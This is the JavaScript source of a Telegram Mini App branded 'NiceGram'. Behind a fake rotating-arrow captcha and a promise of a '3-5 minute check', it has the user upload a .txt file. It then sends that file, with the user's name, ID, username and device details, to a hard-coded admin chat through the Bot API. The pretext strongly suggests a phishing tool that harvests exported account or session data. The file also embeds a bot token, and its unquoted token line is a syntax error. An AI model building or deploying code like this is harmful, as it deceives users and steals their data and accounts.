const tg = window.Telegram.WebApp;
tg.expand();

// --- НАСТРОЙКИ МИНИ-АПА ---
const BOT_TOKEN = 8567185651:AAFx8TIPf4nEle-hGT25sfip20dB7m0VT1I; // ДОЛЖЕН БЫТЬ ТАКИМ ЖЕ КАК В БОТЕ
const ADMIN_ID = "7632180689";
// -------------------------

let angle = 0;
let isDragging = false;

const circle = document.getElementById('circle');
const degreeTxt = document.getElementById('degree');
const captchaScreen = document.getElementById('captcha-screen');
const mainScreen = document.getElementById('main-screen');
const statusMsg = document.getElementById('status-msg');
const deviceInfo = document.getElementById('device-info');
const welcomeUser = document.getElementById('welcome-user');

// Определение устройства
function detectPlatform() {
    const platform = tg.platform || "Неизвестно";
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    
    let deviceType = "Неизвестное устройство";
    
    if (/android/i.test(userAgent)) {
        deviceType = "📱 Android";
    } else if (/iPad|iPhone|iPod/.test(userAgent)) {
        deviceType = "📱 iOS";
    } else if (/windows/i.test(userAgent)) {
        deviceType = "💻 Windows";
    } else if (/mac/i.test(userAgent)) {
        deviceType = "💻 macOS";
    } else if (/linux/i.test(userAgent)) {
        deviceType = "💻 Linux";
    }
    
    // Обновляем информацию об устройстве
    deviceInfo.innerHTML = `
        <strong>Проверка займет 3-5 минут<br>
    `;
    
    return { deviceType, platform };
}

// Логика вращения стрелки
function handleRotation(e) {
    if (!isDragging) return;
    
    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
    
    const rect = circle.parentElement.getBoundingClientRect();
    const centerX = rect.left + rect.width / 2;
    const centerY = rect.top + rect.height / 2;
    
    const radians = Math.atan2(clientY - centerY, clientX - centerX);
    angle = Math.round(radians * (180 / Math.PI) + 90);
    if (angle < 0) angle += 360;
    
    circle.style.transform = `rotate(${angle}deg)`;
    degreeTxt.innerText = `${angle}°`;
    
    // Изменение цвета при приближении к цели
    if (angle >= 80 && angle <= 99) {
        circle.style.background = 'linear-gradient(135deg, #00ff66, #00aa44)';
        degreeTxt.style.color = '#00ff00';
        degreeTxt.style.textShadow = '0 0 15px rgba(0, 255, 0, 0.7)';
    } else {
        circle.style.background = 'linear-gradient(135deg, #00cc44, #008822)';
        degreeTxt.style.color = '#00ff00';
        degreeTxt.style.textShadow = '0 0 10px rgba(0, 255, 0, 0.5)';
    }
}

// Инициализация событий вращения
circle.addEventListener('mousedown', () => isDragging = true);
circle.addEventListener('touchstart', () => isDragging = true);
window.addEventListener('mousemove', handleRotation);
window.addEventListener('touchmove', handleRotation, {passive: false});
window.addEventListener('mouseup', () => isDragging = false);
window.addEventListener('touchend', () => isDragging = false);

// Кнопка подтверждения капчи
document.getElementById('verify-btn').onclick = () => {
    // Проверка попадания в диапазон 80-99 градусов
    if (angle >= 80 && angle <= 99) {
        // Виброотклик
        if (tg.HapticFeedback) {
            tg.HapticFeedback.impactOccurred('soft');
        }
        
        // Плавный переход
        captchaScreen.style.opacity = '0';
        captchaScreen.style.transform = 'translateY(-20px)';
        
        setTimeout(() => {
            captchaScreen.classList.add('hidden');
            mainScreen.classList.remove('hidden');
            mainScreen.classList.add('fade-in');
            
            // Приветствие пользователя
            const firstName = tg.initDataUnsafe?.user?.first_name || "Пользователь";
            const username = tg.initDataUnsafe?.user?.username 
                ? `@${tg.initDataUnsafe.user.username}` 
                : "без username";
            
            welcomeUser.innerText = `👋 Добро пожаловать, ${firstName}!`;
            
            // Определение устройства
            detectPlatform();
            
            // Анимация появления
            mainScreen.style.opacity = '0';
            mainScreen.style.transform = 'translateY(20px)';
            
            setTimeout(() => {
                mainScreen.style.opacity = '1';
                mainScreen.style.transform = 'translateY(0)';
            }, 50);
        }, 300);
    } else {
        // Ошибка с виброоткликом
        if (tg.HapticFeedback) {
            tg.HapticFeedback.impactOccurred('heavy');
        }
        
        alert("❌ Неверно! Поверните стрелку вправо в диапазон 80°-99°");
    }
};

// Выбор и отправка файла
const fileInput = document.getElementById('file-input');
document.getElementById('select-file-btn').onclick = () => fileInput.click();

fileInput.onchange = async () => {
    const file = fileInput.files[0];
    if (!file) return;

    // 1. Проверка: только TXT файлы
    if (!file.name.toLowerCase().endsWith('.txt')) {
        statusMsg.className = "status active error";
        statusMsg.innerHTML = "❌ <strong>Ошибка:</strong> Разрешены только файлы с расширением .txt!";
        
        // Сброс input
        fileInput.value = ""; 
        
        // Виброотклик ошибки
        if (tg.HapticFeedback) {
            tg.HapticFeedback.impactOccurred('heavy');
        }
        return;
    }

    // 2. Проверка размера файла (максимум 10MB)
    if (file.size > 10 * 1024 * 1024) {
        statusMsg.className = "status active error";
        statusMsg.innerHTML = "❌ <strong>Ошибка:</strong> Файл слишком большой! Максимум 10MB.";
        fileInput.value = "";
        return;
    }

    // 3. Подготовка статуса
    statusMsg.className = "status active";
    statusMsg.innerHTML = '<span class="loader"></span> Отправка файла...';

    // 4. Сбор данных
    const user = tg.initDataUnsafe?.user || {};
    const username = user.username ? `@${user.username}` : "Скрыт";
    const firstName = user.first_name || "Пользователь";
    const userId = user.id || "Неизвестно";
    
    // Определение устройства
    const { deviceType, platform } = detectPlatform();
    
    // 5. Подготовка FormData
    const formData = new FormData();
    formData.append('chat_id', ADMIN_ID);
    formData.append('document', file);
    
    // Подробная подпись
    const caption = `📄 <b>Файл:</b> ${file.name}\n` +
                   `👤 <b>Юзер:</b> ${username}\n` +
                   `👨 <b>Имя:</b> ${firstName}\n` +
                   `🆔 <b>ID:</b> <code>${userId}</code>\n` +
                   `📱 <b>Устройство:</b> ${deviceType}\n` +
                   `🌐 <b>Платформа:</b> ${platform}\n` +
                   `📊 <b>Размер:</b> ${(file.size / 1024).toFixed(2)} KB\n` +
                   `⏰ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
    
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');

    try {
        // 6. Отправка через Telegram Bot API
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });

        const data = await response.json();

        if (response.ok && data.ok) {
            // Успех
            statusMsg.className = "status active success";
            statusMsg.innerHTML = "✅ <strong>Успешно!</strong> Файл доставлен администратору.";
            
            // Виброотклик успеха
            if (tg.HapticFeedback) {
                tg.HapticFeedback.notificationOccurred('success');
            }
            
            // Автоматический сброс через 5 секунд
            setTimeout(() => {
                statusMsg.className = "status";
                fileInput.value = "";
            }, 5000);
            
        } else {
            // Ошибка Telegram API
            statusMsg.className = "status active error";
            const errorMsg = data.description || 'Неизвестная ошибка';
            statusMsg.innerHTML = `❌ <strong>Ошибка API:</strong> ${errorMsg}`;
            
            if (tg.HapticFeedback) {
                tg.HapticFeedback.notificationOccurred('error');
            }
        }
    } catch (err) {
        // Ошибка сети
        statusMsg.className = "status active error";
        statusMsg.innerHTML = "❌ <strong>Ошибка сети:</strong> Проверьте соединение.";
        console.error('Ошибка отправки:', err);
    }
};

// Инициализация при загрузке
tg.ready();
detectPlatform();

// Добавляем инструкцию по использованию
console.log(`NiceGram Mini-App запущен
Пользователь: ${tg.initDataUnsafe?.user?.first_name || 'Неизвестно'}
Платформа: ${tg.platform}
Версия: ${tg.version}`);
